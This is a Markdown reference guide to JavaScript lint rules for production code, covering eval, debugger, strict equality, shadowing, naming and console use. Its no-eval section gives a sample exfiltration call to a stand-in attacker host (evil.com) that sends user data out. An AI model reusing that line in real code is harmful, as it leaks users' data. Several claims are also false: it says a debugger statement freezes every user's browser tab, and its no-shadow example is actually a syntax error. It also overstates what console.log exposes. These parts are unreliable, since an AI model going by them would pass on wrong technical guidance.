# ⚠️ JAVASCRIPT SECURITY & PRODUCTION RULES REFERENCE

## CRITICAL RULES (MUST FIX)

### 🔴 no-eval
**What:** Using `eval()` to execute code
```javascript
// ❌ NEVER DO THIS
eval("console.log('hacked')")
eval("fetch('http://evil.com/steal?data=' + userData)")

// ✅ DO THIS
const data = JSON.parse(jsonString)  // Safe parsing
```
**Why:** eval() lets attackers run ANY code they want. It's a security exploit.
**Impact:** CRITICAL security vulnerability

---

### 🔴 no-debugger  
**What:** Leaving `debugger;` statements in code
```javascript
// ❌ NEVER DO THIS
function processPayment() {
  debugger;  // BROWSER FREEZES HERE
  return charge(amount)
}

// ✅ DO THIS
function processPayment() {
  return charge(amount)
}
```
**Why:** When browser hits debugger statement, entire browser tab FREEZES.
**Impact:** Complete application halt for users

---

## HIGH-PRIORITY RULES

### 🟠 no-undef
**What:** Using variables that don't exist
```javascript
// ❌ ERROR
console.log(unknownVar)  // ReferenceError!

// ✅ CORRECT
const unknownVar = 42
console.log(unknownVar)
```

### 🟠 eqeqeq
**What:** Using `==` instead of `===`
```javascript
// ❌ LOOSE EQUALITY (buggy)
if (x == "5") { }  // "5" == 5 returns TRUE

// ✅ STRICT EQUALITY (correct)
if (x === "5") { }  // "5" === 5 returns FALSE
```

### 🟠 no-const-assign
**What:** Trying to reassign const variables
```javascript
// ❌ ERROR
const x = 5
x = 10  // TypeError!

// ✅ CORRECT
let x = 5
x = 10
```

---

## IMPORTANT WARNINGS

### 🟡 no-shadow
**What:** Redeclaring variables in inner scope
```javascript
// ❌ CONFUSING
const data = {
  get: (obj, prop) => {
    const prop = "inner"  // Shadows outer prop!
    return prop  // Which prop? Bug waiting to happen
  }
}

// ✅ CLEAR
const data = {
  get: (obj, prop) => {
    const context = "inner"  // Different name
    return context  // Obvious which variable
  }
}
```

### 🟡 no-var
**What:** Using old `var` keyword
```javascript
// ❌ AVOID
var x = 5  // Hoisting issues, function-scoped

// ✅ USE INSTEAD
const x = 5  // Immutable, block-scoped
// OR
let x = 5   // Mutable, block-scoped
```

### 🟡 camelcase
**What:** Wrong naming conventions
```javascript
// ❌ WRONG
var user_name = "John"      // snake_case for var
class data_service { }      // snake_case for class
const process_data = () => {}  // snake_case for function

// ✅ CORRECT
const userName = "John"       // camelCase
class DataService { }         // PascalCase
const processData = () => {}  // camelCase
```

### 🟡 no-console
**What:** console.log left in production
```javascript
// ❌ PRODUCTION RISK
console.log(userData)  // Visible to all users!
console.debug(apiKey)  // Exposes secrets!

// ✅ PRODUCTION READY
// Remove all console statements
// OR use proper logging:
logger.info(userData)
```

---

## STYLE RULES

### 🟢 curly
**What:** Missing braces in if/for/while
```javascript
// ❌ ERROR PRONE
if (x > 5)
  return true
return false

// ✅ ALWAYS USE BRACES
if (x > 5) {
  return true
}
return false
```

### 🟢 prefer-const
**What:** Using let when const works
```javascript
// ⚠️ SUBOPTIMAL
let handler = { }  // Never changes

// ✅ BETTER
const handler = { }  // Signals intent
```

---

## QUICK SEVERITY GUIDE

| Severity | Count | Action | Rules |
|----------|-------|--------|-------|
| 🔴 CRITICAL | ❌ Must fix | Fix immediately | no-eval, no-debugger |
| 🟠 ERROR | ❌ Must fix | Fix before deploy | eqeqeq, no-undef, no-const-assign |
| 🟡 WARNING | ⚠️ Should fix | Fix before merge | no-shadow, no-var, camelcase, no-console |
| 🟢 STYLE | 💡 Nice to fix | Fix when possible | curly, prefer-const, no-extra-semi |

---

## PRODUCTION CHECKLIST

Before deploying, ensure:

- ❌ No `eval()` anywhere
- ❌ No `debugger;` statements
- ❌ All variables defined (no-undef)
- ❌ Using `===` not `==`
- ❌ No `const` reassignments
- ❌ No console.log statements
- ⚠️  No variable shadowing
- ⚠️  Using proper naming conventions
